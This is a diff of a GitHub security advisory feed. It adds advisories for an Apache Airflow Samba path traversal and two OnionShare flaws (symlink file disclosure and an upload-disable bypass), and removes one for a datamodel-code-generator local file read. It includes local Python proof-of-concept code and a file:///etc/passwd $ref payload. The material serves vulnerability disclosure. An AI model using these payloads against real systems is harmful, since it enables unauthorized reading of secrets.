+        <title type="html"><![CDATA[[apache-airflow-providers-samba] Apache Airflow has a Path Traversal issue]]></title>
+        <id>https://github.com/advisories/GHSA-f6vj-48fm-hmvx</id>
+        <link href="https://github.com/advisories/GHSA-f6vj-48fm-hmvx"/>
+        <updated>2026-07-31T16:37:53.000Z</updated>
+        <content type="html"><![CDATA[<p>The Apache Airflow Samba provider's <code>GCSToSambaOperator</code> joined GCS object names to the SMB destination path without a containment check, so an object named with <code>../</code> segments resolved a write path outside the configured <code>destination_path</code>. An attacker able to write objects into the source GCS bucket — typically an external data producer distinct from the trusted DAG author — could write files to arbitrary locations on the Samba target when the operator ran. Upgrade apache-airflow-providers-samba to 4.12.6 or later, which validates the resolved destination stays within <code>destination_path</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49818">https://nvd.nist.gov/vuln/detail/CVE-2026-49818</a></li>
+<li><a href="https://github.com/apache/airflow/pull/67857">https://github.com/apache/airflow/pull/67857</a></li>
+<li><a href="https://lists.apache.org/thread/3vs0m3p51psgf54tts18d6336g24x3sf">https://lists.apache.org/thread/3vs0m3p51psgf54tts18d6336g24x3sf</a></li>
+<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/8">http://www.openwall.com/lists/oss-security/2026/06/09/8</a></li>
+<li><a href="https://github.com/apache/airflow/commit/bc1df029af15cb1d35d5ca0d33bf9235500137cc">https://github.com/apache/airflow/commit/bc1df029af15cb1d35d5ca0d33bf9235500137cc</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-samba/PYSEC-2026-208.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-samba/PYSEC-2026-208.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-f6vj-48fm-hmvx">https://github.com/advisories/GHSA-f6vj-48fm-hmvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f6vj-48fm-hmvx</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-09T09:32:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[onionshare-cli] OnionShare follows symlinks in shared directories, allowing unintended disclosure of local files]]></title>
+        <id>https://github.com/advisories/GHSA-22p9-r2f5-22mf</id>
+        <link href="https://github.com/advisories/GHSA-22p9-r2f5-22mf"/>
+        <updated>2026-07-31T16:32:06.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>OnionShare CLI/Desktop 2.6.3 can follow symbolic links inside a selected Share or Website directory and serve the symlink target rather than limiting access to files physically contained in the selected directory. If a user shares a directory that contains attacker-supplied or otherwise untrusted symlinks, a remote recipient with access to the OnionShare service can read arbitrary local files readable by the OnionShare process that the symlink points to.</p>
+<p>This affects the shipped <code>onionshare-cli</code> Python package and the desktop application because both call the same <code>onionshare_cli.web</code> file-indexing and streaming code.</p>
+<h3 id="details">Details</h3>
+<p>Tested repository: <code>https://github.com/onionshare/onionshare</code> at commit <code>8cc75e1d7e88bd31f7276733449d412bf71c8999</code>.</p>
+<p>Affected product evidence:</p>
+<ul>
+<li><code>cli/pyproject.toml</code> declares <code>onionshare_cli</code> version <code>2.6.3</code>.</li>
+<li><code>desktop/pyproject.toml</code> declares <code>onionshare</code> version <code>2.6.3</code> and depends on <code>onionshare_cli</code> from <code>../cli</code>.</li>
+<li><code>cli/setup.py</code> publishes <code>onionshare-cli</code> and includes <code>onionshare_cli.web</code> plus templates/static resources.</li>
+<li><code>desktop/setup.py</code> publishes <code>onionshare</code> and exposes both <code>onionshare</code> and <code>onionshare-cli</code> console scripts.</li>
+</ul>
+<p>Reachable default/common paths:</p>
+<ul>
+<li>CLI share mode is the default mode when no <code>--receive</code>, <code>--website</code>, or <code>--chat</code> flag is provided (<code>cli/onionshare_cli/__init__.py:234-241</code>) and accepts filesystem paths from CLI arguments (<code>cli/onionshare_cli/__init__.py:184-189</code>).</li>
+<li>CLI website mode is exposed through <code>--website</code> (<code>cli/onionshare_cli/__init__.py:55-59</code>).</li>
+<li>Desktop Website mode calls <code>self.web.website_mode.set_file_info(self.filenames)</code> before starting (<code>desktop/onionshare/tab/mode/website_mode/__init__.py:281-287</code>). Desktop Share mode calls <code>self.mode.web.share_mode.set_file_info(...)</code> before serving (<code>desktop/onionshare/tab/mode/share_mode/threads.py:42-49</code>).</li>
+<li>Documentation describes Website mode as selecting files/folders and serving them over OnionShare (<code>docs/source/features.rst:109-115</code>).</li>
+</ul>
+<p>Root cause:</p>
+<ul>
+<li><code>SendBaseModeWeb.set_file_info()</code> expands a single selected directory into immediate children and records <code>os.path.isfile()</code> entries without rejecting symlinks (<code>cli/onionshare_cli/web/send_base_mode.py:73-80</code>, <code>cli/onionshare_cli/web/send_base_mode.py:100-130</code>). On POSIX, <code>os.path.isfile()</code> follows a symlink to a regular file.</li>
+<li>Website mode serves any mapped file path through <code>stream_individual_file()</code> (<code>cli/onionshare_cli/web/website_mode.py:71-97</code>). <code>stream_individual_file()</code> opens the mapped filesystem path directly (<code>cli/onionshare_cli/web/send_base_mode.py:199-313</code>, especially <code>open(file_to_download, "rb")</code> at line 237).</li>
+<li>Share mode default <code>/download</code> can include a symlink target when a single selected folder is expanded into root entries and <code>ZipWriter.add_file()</code> calls <code>self.z.write(filename, ...)</code> without rejecting symlinks (<code>cli/onionshare_cli/web/share_mode.py:473-539</code>, <code>cli/onionshare_cli/web/share_mode.py:574-580</code>).</li>
+<li>Share mode with <code>--no-autostop-sharing</code> enables individual file downloads (<code>cli/onionshare_cli/web/share_mode.py:122-125</code>) and reaches the same direct streaming sink (<code>cli/onionshare_cli/web/share_mode.py:430-447</code>).</li>
+<li>A partial mitigation exists only for recursive ZIP directory traversal: <code>ZipWriter.add_dir()</code> skips <code>os.path.islink(full_filename)</code> (<code>cli/onionshare_cli/web/share_mode.py:582-600</code>). That mitigation does not cover Website mode, Share individual downloads, or Share ZIP generation for root-level symlinks after the single-folder expansion path.</li>
+</ul>
+<p>False-positive screening performed:</p>
+<ul>
+<li>URL path traversal without a mapped entry returned 404; the issue is not raw <code>../</code> traversal but symlink following after a selected directory has been indexed.</li>
+<li>Jinja/template escaping and CSP do not mitigate this because the sink is file read/streaming.</li>
+<li>Share mode has a symlink skip in recursive ZIP addition, but local PoC confirmed sibling paths still dereference symlinks.</li>
+<li>The default non-public onion service requires the recipient to know the onion address and private key unless the user opts into public mode; this limits exposure but does not prevent disclosure to an authorized recipient or to anyone with the URL/key.</li>
+</ul>
+<p>Affected versions / patched versions:</p>
+<ul>
+<li>Affected versions: unknown; confirmed in version <code>2.6.3</code> at commit <code>8cc75e1d7e88bd31f7276733449d412bf71c8999</code>. Earlier versions were not tested during this audit.</li>
+<li>Patched versions: 2.6.4</li>
+</ul>
+<p>Severity:</p>
+<ul>
+<li>Rationale: <code>AV:N</code> because the file is exposed over the OnionShare HTTP service; <code>AC:H</code> because exploitation requires the victim to share a directory containing an attacker-influenced or untrusted symlink to a sensitive local file; <code>PR:L</code> because the attacker generally needs the OnionShare URL/private key unless the user intentionally runs public mode; <code>UI:R</code> because the OnionShare user must select/start sharing the affected directory; <code>S:U</code> because the same local process reads and serves the file; <code>C:H</code> because the symlink can point at high-value readable local secrets; <code>I:N/A:N</code> because the confirmed impact is unintended read/disclosure.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>The following safe local proof uses only temporary files and Flask's local test client. In this audit environment, several runtime dependencies were absent (<code>waitress</code>, <code>flask_compress</code>, <code>flask_socketio</code>, <code>unidecode</code>, <code>stem</code>, <code>qrcode</code>), so the harness stubbed those imports while executing the real <code>send_base_mode</code>, <code>website_mode</code>, and <code>share_mode</code> vulnerable code paths. No external network traffic was sent and no real secrets were read.</p>
+<p>Maintainer reproduction from a clean checkout with normal dependencies can omit the import stubs and run the same object/test-client setup, or can start OnionShare locally with a temporary directory containing the symlink.</p>
+<p>Positive setup and trigger:</p>
+<pre><code class="language-python">import os, tempfile, shutil
+from onionshare_cli.common import Common
+from onionshare_cli.settings import Settings
+from onionshare_cli.mode_settings import ModeSettings
+from onionshare_cli.web import Web
+
+base = tempfile.mkdtemp(prefix='os-symlink-final-poc-')
+outside = os.path.join(base, 'outside-secret.txt')
+root = os.path.join(base, 'site')
+os.mkdir(root)
+open(outside, 'w').write('OUTSIDE_SECRET_MARKER')
+os.symlink(outside, os.path.join(root, 'link.txt'))
+
+common = Common()
+common.settings = Settings(common)
+
+w = Web(common, False, ModeSettings(common), 'website')
+w.app.testing = True
+w.website_mode.set_file_info([root])
+with w.app.test_client() as c:
+    print(c.get('/link.txt').status_code)
+    print(c.get('/link.txt').get_data(as_text=True))
+
+s = Web(common, False, ModeSettings(common), 'share')
+s.app.testing = True
+s.share_mode.set_file_info([root])
+with s.app.test_client() as c:
+    print('OUTSIDE_SECRET_MARKER' in c.get('/download').get_data(as_text=True))
+
+s2 = Web(common, False, ModeSettings(common), 'share')
+s2.app.testing = True
+s2.settings.set('share', 'autostop_sharing', False)
+s2.share_mode.set_file_info([root])
+with s2.app.test_client() as c:
+    print(c.get('/link.txt').status_code)
+    print(c.get('/link.txt').get_data(as_text=True))
+
+shutil.rmtree(base)
+</code></pre>
+<p>Observed output from this environment after re-running the proof after drafting:</p>
+<pre><code class="language-text">website_mapped_link_is_symlink: True
+website_positive_status: 200
+website_positive_body: OUTSIDE_SECRET_MARKER
+website_control_status: 404
+website_control_contains_secret: False
+share_zip_status: 200
+share_zip_contains_secret: True
+share_individual_status: 200
+share_individual_body: OUTSIDE_SECRET_MARKER
+cleanup_done: true
+</code></pre>
+<p>Negative/control case:</p>
+<ul>
+<li>Requesting <code>/missing.txt</code> in Website mode returned HTTP 404 and did not contain <code>OUTSIDE_SECRET_MARKER</code>, showing the proof is not a general path traversal or test harness artifact.</li>
+<li>Recursive ZIP traversal has a partial control mitigation in <code>ZipWriter.add_dir()</code> (<code>cli/onionshare_cli/web/share_mode.py:593-596</code>), but the proven variants bypass that sibling mitigation through root-level single-folder expansion and direct file streaming.</li>
+</ul>
+<p>Cleanup:</p>
+<ul>
+<li>The PoC deletes the temporary directory with <code>shutil.rmtree(base)</code>; the audit run printed <code>cleanup_done: true</code>.</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p>A remote recipient of an OnionShare Share or Website service can obtain files outside the selected shared directory if that directory contains a symlink to a readable local file. This can disclose SSH keys, browser profile data, wallet files, documents, or other local secrets readable by the OnionShare process.</p>
+<p>The most realistic attack is a malicious archive/project/export supplied to the OnionShare user that contains a symlink to a sensitive path. If the user extracts or otherwise obtains that directory and shares it with OnionShare, the recipient can request the symlink path through Website mode, Share individual-file mode, or receive it inside the default Share ZIP in the single-folder root-symlink case.</p>
+<p>The issue is especially surprising because one ZIP code path already tries to skip symlinks recursively, which suggests symlink dereference outside the shared tree is not intended.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<p>Reject symlinks and enforce canonical containment both when building the file map and immediately before opening/streaming/zipping a file:</p>
+<ul>
+<li>In <code>SendBaseModeWeb.set_file_info()</code>, do not add paths where <code>os.path.islink(path)</code> is true.</li>
+<li>Track selected root directories as canonical <code>Path.resolve()</code> values and require every served/zipped file's resolved path to remain under one of those roots.</li>
+<li>Re-check the resolved path immediately before <code>open()</code> in <code>stream_individual_file()</code> and before <code>ZipWriter.add_file()</code> / <code>ZipWriter.add_dir()</code> to avoid symlink-swap/TOCTOU surprises.</li>
+<li>Add regression tests for:<ul>
+<li>Website mode serving a root-level symlink.</li>
+<li>Website mode serving a nested symlink.</li>
+<li>Share default <code>/download</code> ZIP for a single selected folder containing a symlink.</li>
+<li>Share <code>--no-autostop-sharing</code> individual-file symlink download.</li>
+<li>Existing recursive ZIP symlink skip behavior.</li>
+</ul>
+</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/onionshare/onionshare/security/advisories/GHSA-22p9-r2f5-22mf">https://github.com/onionshare/onionshare/security/advisories/GHSA-22p9-r2f5-22mf</a></li>
+<li><a href="https://github.com/onionshare/onionshare/commit/48f31cfac077fcc9c04c67c2a6dbf87d956f5eec">https://github.com/onionshare/onionshare/commit/48f31cfac077fcc9c04c67c2a6dbf87d956f5eec</a></li>
+<li><a href="https://github.com/onionshare/onionshare/releases/tag/v2.6.4">https://github.com/onionshare/onionshare/releases/tag/v2.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-22p9-r2f5-22mf">https://github.com/advisories/GHSA-22p9-r2f5-22mf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-22p9-r2f5-22mf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T16:31:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[onionshare-cli] OnionShare Receive mode writes uploaded files even when file uploads are disabled]]></title>
+        <id>https://github.com/advisories/GHSA-v833-3823-cmhp</id>
+        <link href="https://github.com/advisories/GHSA-v833-3823-cmhp"/>
+        <updated>2026-07-31T16:28:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>OnionShare CLI/Desktop 2.6.3 does not enforce the Receive mode <code>disable_files</code> setting at the file upload sink. When a Receive service is configured as a text-message-only endpoint (<code>--disable-files</code> / "Disable uploading files"), a remote sender who can reach the OnionShare service can still send a crafted multipart request containing <code>file[]</code>; OnionShare writes the uploaded bytes to disk before the route handler skips file accounting.</p>
+<p>This affects the shipped <code>onionshare-cli</code> Python package and the desktop application because both use the same <code>onionshare_cli.web.receive_mode</code> request-streaming implementation.</p>
+<h3 id="details">Details</h3>
+<p>Tested repository: <code>https://github.com/onionshare/onionshare</code> at commit <code>8cc75e1d7e88bd31f7276733449d412bf71c8999</code>.</p>
+<p>Affected product evidence:</p>
+<ul>
+<li><code>cli/pyproject.toml</code> declares <code>onionshare_cli</code> version <code>2.6.3</code>.</li>
+<li><code>desktop/pyproject.toml</code> declares <code>onionshare</code> version <code>2.6.3</code> and depends on <code>onionshare_cli</code> from <code>../cli</code>.</li>
+<li><code>cli/setup.py</code> publishes <code>onionshare-cli</code> and includes <code>onionshare_cli.web</code> plus templates/static resources.</li>
+<li><code>desktop/setup.py</code> publishes <code>onionshare</code> and exposes both <code>onionshare</code> and <code>onionshare-cli</code> console scripts.</li>
+</ul>
+<p>Reachable default/common paths:</p>
+<ul>
+<li>CLI Receive mode is exposed through <code>--receive</code> (<code>cli/onionshare_cli/__init__.py:55-57</code>).</li>
+<li>The <code>--disable-files</code> option is documented and stored in mode settings (<code>cli/onionshare_cli/__init__.py:156-160</code>, <code>cli/onionshare_cli/__init__.py:254-261</code>).</li>
+<li>Desktop Receive mode exposes the same setting via the "Disable uploading files" checkbox and stores it as <code>receive.disable_files</code> (<code>desktop/onionshare/tab/mode/receive_mode/__init__.py:89-99</code>, <code>desktop/onionshare/tab/mode/receive_mode/__init__.py:246-254</code>).</li>
+<li>User documentation says "Disable uploading files" should "only allow submitting text messages, like for an anonymous contact form" (<code>docs/source/features.rst:64</code>).</li>
+<li>Advanced documentation lists <code>--disable-files</code> and <code>disable_files</code> as the option to disable receiving files (<code>docs/source/advanced.rst:162-163</code>, <code>docs/source/advanced.rst:455</code>).</li>
+</ul>
+<p>Root cause:</p>
+<ul>
+<li>The Receive template hides the file input when <code>disable_files</code> is set (<code>cli/onionshare_cli/resources/templates/receive.html:51-56</code>), but this is only UI-side.</li>
+<li>The <code>/upload</code> route skips <code>request.files.getlist("file[]")</code> and file accounting when <code>disable_files</code> is enabled (<code>cli/onionshare_cli/web/receive_mode.py:96-135</code>). However, by this point Werkzeug has already parsed the multipart body and invoked the custom stream factory.</li>
+<li><code>ReceiveModeRequest.__init__()</code> treats every <code>POST /upload</code> or <code>POST /upload-ajax</code> as an upload request and creates a receive directory regardless of <code>disable_files</code> (<code>cli/onionshare_cli/web/receive_mode.py:369-391</code>).</li>
+<li><code>ReceiveModeRequest._get_file_stream()</code> creates a writable <code>ReceiveModeFile</code> for each uploaded part without checking <code>self.web.settings.get("receive", "disable_files")</code> (<code>cli/onionshare_cli/web/receive_mode.py:517-540</code>).</li>
+<li><code>ReceiveModeFile</code> opens <code>&lt;receive_mode_dir&gt;/&lt;secure_filename&gt;.part</code>, writes attacker-controlled bytes, then renames the <code>.part</code> file to the final filename (<code>cli/onionshare_cli/web/receive_mode.py:272-285</code>, <code>cli/onionshare_cli/web/receive_mode.py:320-346</code>).</li>
+</ul>
+<p>False-positive screening performed:</p>
+<ul>
+<li><code>secure_filename()</code> is used at <code>cli/onionshare_cli/web/receive_mode.py:111-113</code> and <code>cli/onionshare_cli/web/receive_mode.py:527-528</code>, so the confirmed issue is not path traversal; the file is written under the configured receive data directory.</li>
+<li>The UI hiding the file input is bypassable by direct multipart POST.</li>
+<li>Route-level <code>if not disable_files</code> only affects later accounting/status/webhook behavior; it does not prevent the stream sink from creating and writing the file.</li>
+<li>Default non-public onion services require the sender to know the onion address and private key unless the user opts into public mode. This limits exposure but does not enforce the user-selected "text only" security policy for authorized senders or public contact-form deployments.</li>
+<li>A control case with <code>disable_text=True</code> showed submitted text was not written as a message file, demonstrating the harness was exercising the settings boundary.</li>
+</ul>
+<p>Affected versions / patched versions:</p>
+<ul>
+<li>Affected versions: unknown; confirmed in version <code>2.6.3</code> at commit <code>8cc75e1d7e88bd31f7276733449d412bf71c8999</code>. Earlier versions were not tested during this audit.</li>
+<li>Patched versions: 2.6.4</li>
+</ul>
+<p>Severity:</p>
+<p> Rationale: <code>AV:N</code> because the Receive endpoint is reached over the OnionShare HTTP service; <code>AC:L</code> because a crafted multipart POST is straightforward once the service is reachable; <code>PR:L</code> because the sender generally needs the OnionShare URL/private key unless the receiver intentionally runs public mode; <code>UI:N</code> because no further receiver interaction is required after service startup; <code>S:U</code> because the same local application writes the file; <code>C:N</code> because this PoC does not read data; <code>I:L</code> because the attacker writes unwanted files in a mode configured to reject files; <code>A:L</code> because the bypass can consume disk/storage despite the files-disabled policy, bounded by available disk and operator controls.</p>
+<h3 id="poc">PoC</h3>
+<p>The following safe local proof uses only temporary directories and Flask's local test client. In this audit environment, several runtime dependencies were absent (<code>waitress</code>, <code>flask_compress</code>, <code>flask_socketio</code>, <code>unidecode</code>, <code>stem</code>, <code>qrcode</code>), so the harness stubbed those imports while executing the real <code>receive_mode</code> request parsing and file writing code. No external network traffic was sent and no real files outside temporary directories were modified.</p>
+<p>Maintainer reproduction from a clean checkout with normal dependencies can omit the import stubs and run the same test-client setup, or can start a local Receive service with <code>--disable-files</code> and submit a multipart request to <code>/upload-ajax</code>.</p>
+<p>Positive setup and trigger:</p>
+<pre><code class="language-python">import os, tempfile, shutil
+from io import BytesIO
+from onionshare_cli.common import Common
+from onionshare_cli.settings import Settings
+from onionshare_cli.mode_settings import ModeSettings
+from onionshare_cli.web import Web
+
+base = tempfile.mkdtemp(prefix='os-disable-files-poc-')
+data_dir = os.path.join(base, 'receive-data')
+os.mkdir(data_dir)
+
+common = Common()
+common.settings = Settings(common)
+mode_settings = ModeSettings(common)
+web = Web(common, False, mode_settings, 'receive')
+web.app.testing = True
+web.proxies = None
+web.settings.set('receive', 'data_dir', data_dir)
+web.settings.set('receive', 'disable_files', True)
+
+with web.app.test_client() as c:
+    res = c.post(
+        '/upload-ajax',
+        buffered=True,
+        content_type='multipart/form-data',
+        data={'file[]': (BytesIO(b'DISABLE_FILES_BYPASS_MARKER'), 'audit.txt')},
+    )
+    print(res.status_code)
+    print(res.get_data(as_text=True))
+    for root, dirs, files in os.walk(data_dir):
+        for name in files:
+            path = os.path.join(root, name)
+            print(os.path.relpath(path, data_dir), open(path, 'rb').read().decode())
+
+shutil.rmtree(base)
+</code></pre>
+<p>Observed output from this environment after re-running the proof after drafting:</p>
+<pre><code class="language-text">May 29, 06:13PM: Upload of total size 274.0 B is starting
+=&gt; 27.0 B audit.txt          positive_status: 200
+positive_response: {"info_flashes": ["Nothing submitted or message was too long (&gt; 524288 characters)"]}
+positive_written: [('2026-05-29/181347904165/audit.txt', 'DISABLE_FILES_BYPASS_MARKER')]
+</code></pre>
+<p>The response says nothing/fileless was submitted, but the <code>audit.txt</code> file was created under the Receive data directory.</p>
+<p>Negative/control case:</p>
+<pre><code class="language-python">web2.settings.set('receive', 'disable_text', True)
+# POST only a text field to /upload-ajax
+</code></pre>
+<p>Observed control output:</p>
+<pre><code class="language-text">control_status: 200
+control_response: {"info_flashes": ["Nothing submitted"]}
+control_written_files: []
+cleanup_done: true
+</code></pre>
+<p>Cleanup:</p>
+<ul>
+<li>The PoC deletes all temporary directories with <code>shutil.rmtree(...)</code>; the audit run printed <code>cleanup_done: true</code>.</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p>A Receive service operator can configure OnionShare as a text-only submission endpoint (for example, an anonymous contact form) and still receive attacker-controlled files on disk. This bypasses the explicit user-selected restriction and can lead to unwanted file placement and disk consumption in a deployment where file uploads were intentionally disabled.</p>
+<p>The response and GUI/history accounting can be misleading because the route skips file processing while the lower-level request stream has already written the file. This may delay detection by the operator.</p>
+<p>The confirmed issue does not provide arbitrary path traversal because filenames are sanitized and writes occur under the configured Receive data directory.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<p>Enforce <code>disable_files</code> before any multipart file stream is written, not only in the route handler or template:</p>
+<ul>
+<li>In <code>ReceiveModeRequest._get_file_stream()</code>, if <code>self.web.settings.get("receive", "disable_files")</code> is true, reject the file part before creating <code>ReceiveModeFile</code>, or route it to a discard stream and mark the request as rejected.</li>
+<li>Ensure <code>/upload</code> and <code>/upload-ajax</code> return an explicit error when files are submitted while files are disabled.</li>
+<li>Avoid creating a receive subdirectory for a file-only request that is rejected by policy.</li>
+<li>Add regression tests for both <code>/upload</code> and <code>/upload-ajax</code> proving no file appears under <code>receive.data_dir</code> when <code>receive.disable_files</code> is true.</li>
+<li>Add a control regression test proving <code>disable_text</code> still prevents message-file creation.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/onionshare/onionshare/security/advisories/GHSA-v833-3823-cmhp">https://github.com/onionshare/onionshare/security/advisories/GHSA-v833-3823-cmhp</a></li>
+<li><a href="https://github.com/onionshare/onionshare/commit/a090e97193efc91fbeac9dace7793ea568b83cf5">https://github.com/onionshare/onionshare/commit/a090e97193efc91fbeac9dace7793ea568b83cf5</a></li>
+<li><a href="https://github.com/onionshare/onionshare/releases/tag/v2.6.4">https://github.com/onionshare/onionshare/releases/tag/v2.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-v833-3823-cmhp">https://github.com/advisories/GHSA-v833-3823-cmhp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v833-3823-cmhp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T16:27:59.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[flyto-core] Flyto2 Core: Guarded HTTP modules follow redirects into internal space without per-hop SSRF revalidation]]></title>
         <id>https://github.com/advisories/GHSA-c9hr-64h3-gxpc</id>
@@ -1110,601 +1988,5 @@ rm -f /tmp/penelope_dummy
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-28T21:50:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to arbitrary local file read via JSON-Schema `$ref` (`file://` and `../` traversal), bypassing `--no-allow-remote-refs`]]></title>
-        <id>https://github.com/advisories/GHSA-8359-h9fx-j6v9</id>
-        <link href="https://github.com/advisories/GHSA-8359-h9fx-j6v9"/>
-        <updated>2026-07-28T21:49:37.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>datamodel-code-generator</code> resolves JSON-Schema <code>$ref</code> targets that point at the local filesystem without restricting them to the input/base directory and without honoring the remote-reference security control. In the default configuration, an attacker who controls an input schema (a "paste your OpenAPI/JSON-Schema" service, a CI job that generates models from a submitted spec, or any multi-tenant codegen platform) can read any file the process user can read and map the host filesystem. This works via either a <code>file://</code> absolute URI or a <code>../</code>-escaped relative reference, and it succeeds even when <code>--no-allow-remote-refs</code> is set.</p>
-<p>This is an unauthenticated path-traversal / information-disclosure issue (CWE-22 / CWE-200) plus a bypass of a documented security control.</p>
-<h3 id="details">Details</h3>
-<p><code>is_url()</code> classifies <code>file://</code> as a URL (<code>reference.py:1249</code>):</p>
-<pre><code class="language-python">def is_url(ref: str) -&gt; bool:
-    return ref.startswith(("https://", "http://", "file://"))
-</code></pre>
-<p>The remote-ref gate then explicitly exempts <code>file://</code>, so <code>--no-allow-remote-refs</code> never applies to it (<code>parser/jsonschema.py</code>, <code>_get_ref_body</code>):</p>
-<pre><code class="language-python">if is_url(resolved_ref):
-    if not resolved_ref.startswith("file://") and self.http_local_ref_path is None:
-        if self.allow_remote_refs is False:
-            raise Error(...)        # &lt;-- skipped for file://
-        ...
-    return self._get_ref_body_from_url(resolved_ref)
-return self._get_ref_body_from_remote(resolved_ref)
-</code></pre>
-<p>Both local-file branches read the target with <strong>no containment check</strong>. The <code>file://</code> branch reads any absolute path:</p>
-<pre><code class="language-python"># _get_ref_body_from_url
-if ref.startswith("file://"):
-    path = url2pathname(urlparse(ref).path)     # absolute path, anywhere on disk
-    return self.remote_object_cache.get_or_put(
-        ref, default_factory=lambda _: load_data_from_path(Path(path), self.encoding))
-</code></pre>
-<p>and the plain relative branch lets <code>../</code> escape the base directory:</p>
-<pre><code class="language-python"># _get_ref_body_from_remote
-full_path = self.base_path / resolved_ref       # no is_relative_to(base_path) check
-return self.remote_object_cache.get_or_put(
-    str(full_path), default_factory=lambda _: load_data_from_path(full_path, self.encoding))
-</code></pre>
-<p>For contrast, the HTTP-local-ref branch (<code>_get_ref_body_from_local_http_path</code>) <em>does</em> enforce <code>is_relative_to(base_path)</code>; these two filesystem branches do not. (This is distinct from the previously reported HTTP <code>$ref</code>/<code>--url</code> SSRF hardened in <code>http.py</code>  these code paths never enter <code>http.py</code>.)</p>
-<p>The fetched file is read and parsed, yielding two impacts:</p>
-<ol>
-<li><p><strong>Arbitrary file read + filesystem oracle (any file).</strong> The process opens any readable path, and the three distinguishable outcomes leak filesystem structure: <code>Expected dict, got str/list</code> = the file exists and was read into the process; <code>FileNotFoundError: '&lt;abs path&gt;'</code> = missing; <code>PermissionError: '&lt;abs path&gt;'</code> = exists but unreadable. An attacker uses this to probe arbitrary paths and recover the operator's absolute filesystem layout.</p>
-</li>
-<li><p><strong>Verbatim secret disclosure into the generated code.</strong> When the referenced node is JSON-Schema-shaped, values in <code>const</code>/<code>default</code>/<code>enum</code>/<code>description</code> positions are emitted verbatim into the generated Python that is returned to the attacker — i.e. exactly the internal/private schema and config files a codegen host stores (specs with example/default tokens, default credentials, internal hostnames, service-account JSON, k8s secret manifests).</p>
-</li>
-</ol>
-<p>Scope note (to avoid overstating): the <em>raw bytes</em> of unstructured files such as <code>/etc/passwd</code> or a PEM <code>id_rsa</code> are read into the process but are not echoed verbatim into the output, because they parse to a single scalar and are rejected as "not a schema". For those files the impact is the read itself plus the existence/permission/absolute-path oracle; verbatim content disclosure applies to schema-shaped nodes.</p>
-<h3 id="poc">PoC</h3>
-<p>Self-contained reproducer: <a href="https://gist.github.com/thegr1ffyn/2a87e81f985883acc30d0118c52da4d3">https://gist.github.com/thegr1ffyn/2a87e81f985883acc30d0118c52da4d3</a> /  (<code>poc.py</code> creates everything in a temp dir, runs the generator, asserts read + leak + gate bypass, and cleans up). 
-Minimal manual reproduction of the arbitrary read (any path works):</p>
-<pre><code class="language-bash">printf '{"type":"object","properties":{"x":{"$ref":"file:///etc/passwd"}}}' &gt; probe.json
-datamodel-codegen --input probe.json --input-file-type jsonschema --output o.py
-# -&gt; "TypeError: Expected dict, got str"  == /etc/passwd was opened and fully parsed.
-# Swap the $ref for a missing/unreadable path to see the existence/permission oracle.
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Arbitrary local file read / path traversal (CWE-22) → information disclosure (CWE-200), plus bypass of <code>--no-allow-remote-refs</code>. Any application, CI pipeline, or multi-tenant service that runs <code>datamodel-code-generator</code> on an untrusted schema and exposes (returns, logs, commits, renders) the generated code is affected. The attacker can: open and read any file the process user can read (demonstrated: <code>/etc/passwd</code>, a PEM <code>id_rsa</code>, paths under <code>/root/</code>); map the host filesystem and recover absolute paths; and exfiltrate secret values verbatim from any schema-shaped node. Attacker controls only the input schema; no authentication or special privileges required.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<ol>
-<li>Do not exempt <code>file://</code> from the <code>allow_remote_refs</code> gate, treat it as an external scheme.</li>
-<li>In both <code>_get_ref_body_from_url</code> (the <code>file://</code> case) and <code>_get_ref_body_from_remote</code>, reject targets that are not <code>resolved.is_relative_to(self.base_path)</code>, mirroring the existing check in <code>_get_ref_body_from_local_http_path</code>.</li>
-</ol>
-<h3 id="maintainer-status">Maintainer status</h3>
-<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.62.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-8359-h9fx-j6v9/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-8359-h9fx-j6v9/pull/1</a></p>
